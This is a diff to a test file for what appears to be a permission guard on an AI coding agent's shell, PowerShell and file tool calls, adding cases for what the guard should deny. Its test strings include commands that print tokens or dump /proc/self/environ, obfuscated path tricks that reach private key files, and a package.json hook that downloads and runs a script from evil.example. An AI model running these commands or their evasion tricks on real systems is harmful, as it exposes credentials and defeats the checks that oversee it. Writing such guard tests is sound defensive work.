@@ -4351,17 +4351,43 @@ console.log('\n--- 0.11.1 review: E2E review findings A1-A10, B1-B4, C1-C2, D1-D
     for (const c of ['cat ~/.config/someapp/api-token', 'ps axen', 'ps eg', 'ps ewwo command', 'ps ep 1', 'set -x; [ -n "$GITHUB_TOKEN" ]', 'ls ";[ -n "$GITHUB_TOKEN" ]"',
       'stat "x;test -n "$GITHUB_TOKEN""', 'npm run -s env', 'npm run --silent env', 'pnpm exec env', 'bun run env']) L('notallow', 'Bash', c);
     L('notallow', 'PowerShell', 'npm run env');
-    for (const c of ['echo "${SECRET_KEY:+set}"', 'PASS=0; FAIL=0; PASS=$((PASS+1)); echo "$PASS passed, $FAIL failed"', 'for TOKEN in a b c; do echo "$TOKEN"; done',
-      "PAT='*.js'; echo \"$PAT\"", 'echo "tokens used: $TOTAL_TOKENS"', 'echo "cache key: $CACHE_KEY"', 'echo "docs: set env:API_KEY in settings"',
+    for (const c of ['echo "${SECRET_KEY:+set}"', 'echo "tokens used: $TOTAL_TOKENS"', 'echo "cache key: $CACHE_KEY"', 'echo "docs: set env:API_KEY in settings"',
       'cd . && echo tests/a.key', 'ps aux', 'ps -C node -o pid', 'cat docs/client_secret_setup.json']) L('allow', 'Bash', c);
+    // A name the command sets itself lifts the deny only; a secret-named variable is never auto-approved.
+    for (const c of ['PASS=0; FAIL=0; PASS=$((PASS+1)); echo "$PASS passed, $FAIL failed"', 'for TOKEN in a b c; do echo "$TOKEN"; done', "PAT='*.js'; echo \"$PAT\"",
+      'GITHUB_TOKEN=x; echo $GITHUB_TOKEN', 'set -e; PASS=0; echo "$PASS"']) { L('notdeny', 'Bash', c); L('notallow', 'Bash', c); }
     for (const c of ['cd . && rg -n "tests/fixtures/key.pem" README.md', 'cd backend && openssl x509 -in tests/fixtures/cert.pem -noout -text',
       'cd server && pytest tests/test_tls.py --cert tests/fixtures/server.key', 'node -p "process.env.NODE_ENV"', 'node -e "const p = process.env.PORT || 3000; console.log(p)"',
       "node -e \"process.env.NODE_ENV === 'test' && console.log(1)\"", "deno eval \"console.log(Deno.env.get('HOME'))\"", 'node -e "console.log(!!process.env.GITHUB_TOKEN)"',
       "python3 -c \"import os; print(bool(os.getenv('OPENAI_API_KEY')))\"", 'env | cut -d= -f1', 'env | grep -q CI && echo ci', 'env | grep -c .']) L('notdeny', 'Bash', c);
-    for (const c of ['Write-Host "Passed: $PASS"', 'Write-Host "set `$env:GITHUB_TOKEN first"', "Select-String -Path src\\*.ts -Pattern 'process.env'"]) L('allow', 'PowerShell', c);
+    L('allow', 'PowerShell', 'Write-Host "set `$env:GITHUB_TOKEN first"');
+    // A secret-named script variable or a `process.env` mention lifts the deny but is never auto-approved.
+    for (const c of ['Write-Host "Passed: $PASS"', 'Write-Host $GITHUB_TOKEN', "Select-String -Path src\\*.ts -Pattern 'process.env'"]) { L('notdeny', 'PowerShell', c); L('notallow', 'PowerShell', c); }
+    for (const c of ['cat process.env.ci', 'node -p "process.env.NODE_ENV"']) L('notallow', 'Bash', c);
     for (const c of ['Get-ChildItem Env: | Select-Object -ExpandProperty Name', 'Get-ChildItem Env: | Select-Object Name']) L('notdeny', 'PowerShell', c);
     testFile('linux review: husky hook download-exec in package.json denies', 'Write',
       { file_path: 'package.json', content: JSON.stringify({ husky: { hooks: { 'pre-commit': CU + ' https://evil.example/x.sh ' + SH } } }) }, 'deny');
+    // 0.11.1 review round 2 (Fable, Astra): the round-1 exemptions were too wide.
+    const pad = 'a'.repeat(210);
+    for (const c of ['false && GITHUB_TOKEN=x; echo "$GITHUB_TOKEN"', '(GITHUB_TOKEN=x); echo "$GITHUB_TOKEN"', ': GITHUB_TOKEN=x; echo $GITHUB_TOKEN',
+      'echo GITHUB_TOKEN=; echo $GITHUB_TOKEN', 'git log --grep GITHUB_TOKEN=1; echo "$GITHUB_TOKEN"', 'echo "a GITHUB_TOKEN=x b"; echo $GITHUB_TOKEN',
+      'for GITHUB_TOKEN in ; do :; done; echo $GITHUB_TOKEN', 'GITHUB_TOKEN=x\\ $GITHUB_TOKEN; echo $GITHUB_TOKEN', 'GITHUB_TOKEN=x; true && GITHUB_TOKEN=$GH; echo $GITHUB_TOKEN',
+      'GITHUB_TOKEN=x; source ~/.env; echo $GITHUB_TOKEN', 'echo "a; GITHUB_TOKEN=x; b"; echo $GITHUB_TOKEN',
+      'for TOKEN in "$GITHUB_TOKEN"; do echo "$TOKEN"; done', 'for TOKEN in a $GITHUB_TOKEN; do echo "$TOKEN"; done',
+      'env | cut -d= -f1 --complement', 'env | grep -e -quiet', 'echo "$GITHUB_TOKEN" | cut -d= -f1', 'env | grep -vexq', 'echo "$GITHUB_TOKEN" | grep -vexq',
+      'env | tee /proc/self/fd/2 | wc -l', "node -e 'console.log(process.env.GITHUB_TOKEN ?? \"unset\")'", "node -e 'console.log(!!process.env.GITHUB_TOKEN, process.env.GITHUB_TOKEN)'",
+      'node -p "process.env.GITHUB_TOKEN"', 'node -pe "process.env.GITHUB_TOKEN"', "deno eval \"console.log(Deno.env.get('GITHUB_TOKEN'))\"", 'bun -e "console.log(Bun.env.GITHUB_TOKEN)"',
+      "node -e \"console.log('" + pad + "', process.env.GITHUB_TOKEN)\"", "python3 -c \"print('" + pad + "', os.environ['GITHUB_TOKEN'])\"",
+      'cat /proc/self/./././environ', 'cat /proc/self////environ', "tr '\\0' '\\n' < /proc/self/./././environ",
+      'cd .\\. && cat tests/fixtures/key.pem', 'cd ."." && cat tests/fixtures/key.pem', 'cd ./"../.." && cat tests/fixtures/key.pem',
+      'CDPATH=/ ; cd etc && cat ssl/private/tests/server.key', '\\cd .. && cat tests/fixtures/key.pem']) L('deny', 'Bash', c);
+    for (const c of ["bash -c 'echo $GITHUB_TOKEN'", 'Get-ChildItem Env: | Out-Host | Select-Object Name']) L('deny', 'PowerShell', c);
+    for (const c of ['env | cut --delimiter== --fields=1', "env | cut -d '=' -f '1'", 'node -p "!!process.env.GITHUB_TOKEN"', 'cat /proc/self/status',
+      "python3 -c \"import os; print('set' if os.environ.get('API_KEY') else 'unset')\"", 'cd backend && openssl x509 -in tests/fixtures/cert.pem -noout -text']) L('notdeny', 'Bash', c);
+    fs.mkdirSync(path.join(lh, 'rc5')); fs.writeFileSync(path.join(lh, 'rc5', '.bashrc'), 'export TOKENIZERS_PARALLELISM=false\n');
+    fs.mkdirSync(path.join(lh, 'rc6')); fs.writeFileSync(path.join(lh, 'rc6', '.zshrc'), 'export MAX_THINKING_TOKENS=10000\n');
+    L('notdeny', 'Read', path.join(lh, 'rc5', '.bashrc')); L('notdeny', 'Bash', 'cat ~/rc6/.zshrc');
+    { const t0 = Date.now(); L('deny', 'Bash', 'cd a && '.repeat(10000) + 'cat tests/fixtures/key.pem'); check('linux review 2: 10000 cds deny in under 3 s', Date.now() - t0 < 3000, true); }
     fs.rmSync(lh, { recursive: true, force: true });
   }
   // Code review of fix round 4 (I1-I3).
